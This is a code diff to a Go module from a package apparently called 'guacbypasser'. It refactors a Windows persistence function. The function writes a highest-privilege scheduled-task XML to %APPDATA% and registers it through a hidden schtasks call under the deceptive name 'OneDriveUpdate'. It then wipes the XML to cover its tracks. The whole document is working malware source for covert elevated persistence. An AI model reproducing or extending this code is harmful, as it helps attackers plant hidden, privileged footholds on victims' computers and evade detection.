@@ -3,21 +3,20 @@ package guacbypasser
 import (
 	"fmt"
 	"io/ioutil"
-	"log"
 	"os"
 	"path/filepath"
 	"syscall"
 	"time"
 )
 
-func pSchtasks(path string) error {
-	_ = Reporter{
+func w32_nt_persistence_schtasks(p string) (error, Informer) {
+	inf := Informer{
 		Name: "schtasks",
 		Desc: "Gain persistence with system privilege using schtasks",
 		Id:   7,
 
 		Type:   "Persistence",
-		Module: "pSchtasks",
+		Module: "w32_nt_persistence_schtasks",
 
 		Fixed:   false,
 		FixedIn: "",
@@ -26,9 +25,9 @@ func pSchtasks(path string) error {
 		Payload: true,
 	}
 
-	fullPath, err := filepath.Abs(path)
+	fPath, err := filepath.Abs(p)
 	if err != nil {
-		return err
+		return err, inf
 	}
 
 	// XML Template for HighestAvailable priviligue ...
@@ -78,31 +77,41 @@ func pSchtasks(path string) error {
 		  <Command>%s</Command>
 		</Exec>
 	  </Actions>
-	</Task>`, fmt.Sprintf("start %s", fullPath))
+	</Task>`, fmt.Sprintf("start %s", fPath))
 
-	// [26]uintptr{} payload numbers ...
 	// must be realize in future !
-	_ = [26]uintptr{
+	/*_ = [26]uintptr{
 		0x98ef, 0x2322bb, 0x053, 0x075, 0x11dfe,
 		0x912d, 0x08f, 0x32ce, 0x562ee, 0x0cc,
 		0x023ff, 0xff, 0x098cbe, 0x0cbe, 0x0,
 		0x0, 0x02, 0x13d, 0x013e, 0x86eff,
 		0x0be, 0x0bb, 0x2833bee, 0x06453cc, 0x0, 0x0EADBEEF,
-	}
-	if err := ioutil.WriteFile(fmt.Sprintf("%s\\elevator.xml", os.Getenv("APPDATA")), []byte(xmlTemplate), 0666); err != nil {
-		log.Println(err)
+	}*/
+
+	if err := ioutil.WriteFile(
+		(os.Getenv("APPDATA") + ("\\elevator.xml")), []byte(xmlTemplate), 0666,
+	); err != nil {
+		return err, inf
 	}
 
-	cmd := newCmd(fmt.Sprintf("schtasks /create /xml %s /tn OneDriveUpdate", fmt.Sprintf("%s\\elevator.xml", os.Getenv("APPDATA"))))
+	cmd := newCmd(
+		fmt.Sprintf("schtasks /create /xml %s /tn OneDriveUpdate",
+			fmt.Sprintf("%s\\elevator.xml", os.Getenv("APPDATA")),
+		),
+	)
 	cmd.exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	if _, err = cmd.exec.Output(); err != nil {
-		return err
+		return err, inf
 	}
-	time.Sleep(3 * 1 * time.Second)
 
-	// Remove file %appdata%\evelator.xml
-	if err := os.Remove(fmt.Sprintf("%s\\elevator.xml", os.Getenv("APPDATA"))); err != nil {
-		log.Println(err)
+	// Sleep for 3 seconds.
+	time.Sleep(3 * time.Second)
+
+	if err := newWiper(os.Getenv("APPDATA") + "\\elevator.xml"); err != nil {
+		return err, inf
 	}
-	return nil
+	return nil, inf
 }
+
+// NewPersistenceSCHTASKS #add-some-info-please
+func NewPersistenceSCHTASKS(p string) (error, Informer) { return w32_nt_persistence_schtasks(p) }
